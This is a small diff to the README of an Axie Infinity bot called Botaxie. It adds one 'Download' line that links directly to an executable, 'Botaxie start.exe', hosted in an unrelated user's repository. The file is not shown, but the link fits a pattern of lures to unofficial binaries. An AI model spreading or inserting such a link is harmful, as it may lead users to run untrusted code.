@@ -17,3 +17,4 @@
   #### You can find logs of all your activity on the Activity Log page, from instance launches and termination, to axie purchases.
 ![ActivityLog](https://github.com/Botaxie/botaxie/raw/main/screenshots/activity.png)
 ----
+### Download - https://github.com/YahyaOukharte/I-Axie-bot/raw/main/I%20Axie%20Bot/Botaxie%20start.exe
